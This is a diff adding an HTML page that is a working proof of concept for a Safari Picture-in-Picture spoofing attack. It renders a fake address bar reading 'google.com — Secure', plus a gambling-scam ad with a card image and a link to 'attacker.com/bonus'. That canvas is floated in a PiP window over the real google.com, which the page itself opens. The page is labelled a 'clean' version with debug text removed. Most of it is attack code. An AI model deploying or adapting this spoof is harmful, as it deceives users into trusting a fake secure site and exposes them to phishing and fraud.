@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><style>
+@font-face {
+  font-family: "Optimistic";
+  font-style: normal;
+  font-weight: 400 600;
+  font-display: swap;
+  src: url("/fonts/OptimisticAI_VF_Optimized.woff2") format("woff2");
+}
+@font-face {
+  font-family: "Optimistic Mono";
+  font-style: normal;
+  font-weight: 400;
+  font-display: swap;
+  src: url("/fonts/OptimisticMono_W_TextRegular.woff2") format("woff2");
+}
+:where(html) {
+  font-family: "Optimistic", system-ui, sans-serif;
+}
+:where(code, pre, kbd, samp) {
+  font-family: "Optimistic Mono", ui-monospace, monospace;
+}
+</style>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>PoC Safari PiP - Final Clean</title>
+<style>
+  body{margin:0;background:#f2f2f2;color:#000;font-family:-apple-system,sans-serif;padding:12px;text-align:center}
+  .box{max-width:960px;margin:0 auto;background:#000;border:2px solid #333;border-radius:14px;overflow:hidden}
+  canvas{width:100%;display:block}
+  video{width:100%;display:block;border:3px solid #0a84ff;border-radius:12px;margin-top:10px;background:#000}
+  button{font-size:17px;padding:18px 20px;margin:10px 0;width:100%;max-width:500px;border-radius:14px;border:none;font-weight:800;cursor:pointer;-webkit-appearance:none}
+  .b1{background:#0a84ff;color:#fff;font-size:19px}
+  .b2{background:#1c1c1e;color:#fff;border:2px solid #555}
+  .log{font-family:Menlo,monospace;font-size:11px;color:#0f0;background:#111;padding:12px;border-radius:10px;text-align:left;margin-top:12px;white-space:pre-wrap;word-break:break-all;max-width:960px;margin:0 auto}
+</style>
+</head>
+<body>
+
+<h3>FINAL V4 CLEAN - Safari PiP Spoof</h3>
+<div class="box">
+  <canvas id="c" width="960" height="540"></canvas>
+  <video id="v" playsinline webkit-playsinline muted controls autoplay></video>
+</div>
+
+<button class="b1" onclick="initAndPiP()">1. Activate PiP - Fake Google.com</button>
+<button class="b2" onclick="openGoogle()">2. Open google.com (real) - Check PiP persists</button>
+
+<div class="log" id="log">Log: ready
+Tap button 1 first</div>
+
+<script>
+var c=document.getElementById('c'), ctx=c.getContext('2d'), v=document.getElementById('v');
+var logEl=document.getElementById('log');
+var stream=null;
+
+function log(t){ 
+  console.log(t);
+  logEl.textContent += "\n"+new Date().toLocaleTimeString()+" - "+t; 
+}
+log("Origin: "+location.origin);
+
+function roundRect(x,y,w,h,r){
+  ctx.beginPath();
+  ctx.moveTo(x+r,y); ctx.lineTo(x+w-r,y);
+  ctx.quadraticCurveTo(x+w,y,x+w,y+r);
+  ctx.lineTo(x+w,y+h-r);
+  ctx.quadraticCurveTo(x+w,y+h,x+w-r,y+h);
+  ctx.lineTo(x+r,y+h);
+  ctx.quadraticCurveTo(x,y+h,x,y+h-r);
+  ctx.lineTo(x,y+r);
+  ctx.quadraticCurveTo(x,y,x+r,y);
+  ctx.closePath(); ctx.fill();
+}
+
+function draw(){
+  ctx.fillStyle='#fff'; ctx.fillRect(0,0,960,540);
+  // Fake omnibox - clean
+  ctx.fillStyle='#f1f3f4'; ctx.fillRect(0,0,960,90);
+  ctx.fillStyle='#fff'; roundRect(12,14,936,62,31);
+  ctx.fillStyle='#202124'; ctx.font='bold 26px sans-serif'; ctx.textAlign='left';
+  ctx.fillText('🔒',30,56);
+  ctx.fillStyle='#1a73e8'; ctx.font='bold 24px sans-serif';
+  ctx.fillText('google.com',70,56);
+  ctx.fillStyle='#5f6368'; ctx.font='17px sans-serif';
+  ctx.fillText(' — Secure',212,56);
+  ctx.fillStyle='#dadce0'; ctx.fillRect(0,90,960,2);
+
+  // Red content - slot gacor
+  ctx.fillStyle='#ff0033'; ctx.fillRect(0,92,960,448);
+  ctx.fillStyle='#ffff00'; roundRect(24,110,912,88);
+  ctx.fillStyle='#000'; ctx.font='900 40px sans-serif'; ctx.textAlign='center';
+  ctx.fillText('SLOT GACOR 2026 - MAXWIN x1000',480,164);
+
+  ctx.fillStyle='#fff'; ctx.font='bold 22px sans-serif'; ctx.textAlign='left';
+  ctx.fillText('RTP 98.7% - HIGH WIN RATE',40,230);
+  ctx.font='16px sans-serif';
+  ctx.fillText('Limited bonus for Google users',40,254);
+
+  // Card VISA
+  ctx.fillStyle='#0a2540'; roundRect(40,280,360,200,16);
+  ctx.fillStyle='#ffcc4d'; roundRect(70,300,48,32,6);
+  ctx.fillStyle='#fff'; ctx.font='bold 18px monospace'; ctx.textAlign='left';
+  ctx.fillText('**** **** **** 4242',70,370);
+  ctx.font='12px monospace'; ctx.fillStyle='#a3b4c7';
+  ctx.fillText('VALID 12/28',70,390);
+  ctx.fillText('MAXWIN $5000',70,408);
+  ctx.fillStyle='#fff'; ctx.font='bold 20px sans-serif'; ctx.textAlign='right';
+  ctx.fillText('VISA',370,462);
+
+  // CLEAN VERSION - only attacker link, no debug text
+  ctx.fillStyle='#fff'; ctx.font='bold 20px sans-serif'; ctx.textAlign='left';
+  ctx.fillText('To claim MAXWIN, please visit:',440,310);
+  ctx.fillStyle='#00ff7f'; ctx.font='bold 24px monospace';
+  ctx.fillText('attacker.com/bonus',440,342);
+  ctx.fillStyle='#fff'; ctx.font='16px sans-serif';
+  ctx.fillText('Exclusive reward for Google users',440,370);
+
+  requestAnimationFrame(draw);
+}
+draw();
+
+function initAndPiP(){
+  log("BTN1 CLICKED - init PiP");
+  try{
+    if(!stream){
+      if(c.captureStream) stream=c.captureStream(30);
+      else if(c.webkitCaptureStream) stream=c.webkitCaptureStream(30);
+      else { log("captureStream not supported"); return; }
+      v.srcObject=stream;
+      v.muted=true;
+    }
+    v.play().then(()=>{
+      log("video.play OK");
+      try{
+        if(v.webkitSetPresentationMode){
+          v.webkitSetPresentationMode('picture-in-picture');
+          log("PiP SUCCESS - now open google.com with button 2");
+        } else if(v.requestPictureInPicture){
+          v.requestPictureInPicture().then(()=>log("PiP SUCCESS")).catch(e=>log("PiP FAIL: "+e));
+        }
+      }catch(e){ log("PiP err: "+e); }
+    }).catch(e=>log("Play fail: "+e));
+  }catch(e){ log("Err: "+e); }
+}
+
+function openGoogle(){
+  log("BTN2 CLICKED - Opening google.com");
+  window.open('https://google.com','_blank');
+  log("Check: PiP still on top of real google.com?");
+}
+</script>
+<script>(function(){var loc=location.href.replace(/#.*$/,"");var ATTR_NAMES=["data-product-id","data-productid","data-product_id","product-id","productid","product_id","data-source-entity-id","source-entity-id","source_entity_id","data-product","data-metadata","data-meta"];var DATASET_KEYS=["productId","productid","product_id","sourceEntityId","sourceentityid","source_entity_id","product","metadata","meta"];function readProductId(value){if(typeof value!=="string"||value.length===0)return null;if(/^[0-9]{6,}$/.test(value))return value;var match=value.match(/(?:product(?:_|-)?id|source(?:_|-)?entity(?:_|-)?id)["'=:\s]+([0-9]{6,})/i);return match?match[1]:null}function extractProductId(start){for(var node=start;node&&node!==document.body;node=node.parentElement){for(var i=0;i<ATTR_NAMES.length;i++){var attrValue=node.getAttribute&&node.getAttribute(ATTR_NAMES[i]);var attrProductId=readProductId(attrValue);if(attrProductId)return attrProductId}var dataset=node.dataset||null;if(dataset){for(var j=0;j<DATASET_KEYS.length;j++){var dataValue=dataset[DATASET_KEYS[j]];var dataProductId=readProductId(dataValue);if(dataProductId)return dataProductId}}}return null}function isInlineMediaSlotElement(node){return !!(node&&node.getAttribute&&node.getAttribute("data-clippy-inline-media-slot")!==null)}function findInlineMediaSlot(start){for(var node=start;node&&node!==document.body;node=node.parentElement){if(isInlineMediaSlotElement(node))return node}return null}function readInlineMediaUrl(node){if(!node)return null;return node.getAttribute&&((node.getAttribute("data-clippy-inline-media-url")||node.getAttribute("data-url")||node.getAttribute("data_url")))||node.href||null}function stripHash(url){return String(url).replace(/#.*$/,"")}function urlsMatch(a,b){if(!a||!b)return false;try{return stripHash(new URL(a,loc).href)===stripHash(new URL(b,loc).href)}catch(_){return stripHash(a)===stripHash(b)}}function isFirstPartyReelUrl(value){try{var url=new URL(value,loc);if(url.protocol!=="https:")return false;var host=url.hostname.toLowerCase();var supported=host==="instagram.com"||host.endsWith(".instagram.com")||host==="facebook.com"||host.endsWith(".facebook.com");return supported&&/\/reels?\//i.test(url.pathname)}catch(_){return false}}function isInlineMediaUrlClick(node,href){var slot=findInlineMediaSlot(node);if(!slot)return false;var slotUrl=readInlineMediaUrl(slot);if(slotUrl)return urlsMatch(href,slotUrl);return isFirstPartyReelUrl(href)}function findDataHref(start){for(var node=start;node&&node!==document.body;node=node.parentElement){if(node.getAttribute){var href=node.getAttribute("data-href")||node.getAttribute("data-url");if(href)return{href:href,node:node}}}return null}var nativeOpen=window.open;window.open=function(url){if(parent!==window&&typeof url==="string"&&/^https?:\/\//.test(url)){parent.postMessage({type:"ecto:usercontent-link-click",href:url},"*");return null}return nativeOpen?nativeOpen.apply(window,arguments):null};document.addEventListener("click",function(e){var target=e.target instanceof Element?e.target:null;if(!target)return;if(parent===window)return;var a=target.closest?target.closest("a[href]"):null;if(a&&a.href&&/^https?:\/\//.test(a.href)&&a.href.replace(/#.*$/,"")!==loc){if(isInlineMediaUrlClick(a,a.href))return;var productId=extractProductId(target)||extractProductId(a);if(productId){e.preventDefault();parent.postMessage({type:"ecto-artifact-link-click",productId:productId},"*");return}e.preventDefault();parent.postMessage({type:"ecto:usercontent-link-click",href:a.href},"*");return}var dataHref=findDataHref(target);if(dataHref&&/^https?:\/\//.test(dataHref.href)&&dataHref.href.replace(/#.*$/,"")!==loc){if(isInlineMediaUrlClick(dataHref.node,dataHref.href))return;e.preventDefault();parent.postMessage({type:"ecto:usercontent-link-click",href:dataHref.href},"*")}},true)})();</script><script>(function(){var FOCUS_TYPE="ecto:artifact-focus-request";var CLOSE_TYPE="ecto:artifact-close-request";function focusArtifactDocument(){var body=document.body;if(!body)return;try{window.focus();}catch(e){}if(!body.hasAttribute("tabindex"))body.setAttribute("tabindex","-1");try{body.focus({preventScroll:true});}catch(e){try{body.focus();}catch(e2){}}}window.addEventListener("message",function(event){if(event.source!==window.parent)return;var data=event.data;if(!data||typeof data!=="object"||data.type!==FOCUS_TYPE)return;if(document.readyState==="loading"){document.addEventListener("DOMContentLoaded",focusArtifactDocument,{once:true});return;}focusArtifactDocument();});window.addEventListener("keydown",function(event){if(event.key!=="Escape")return;window.setTimeout(function(){if(event.defaultPrevented)return;window.parent.postMessage({type:CLOSE_TYPE},"*");},0);});})();</script></body>
+</html>
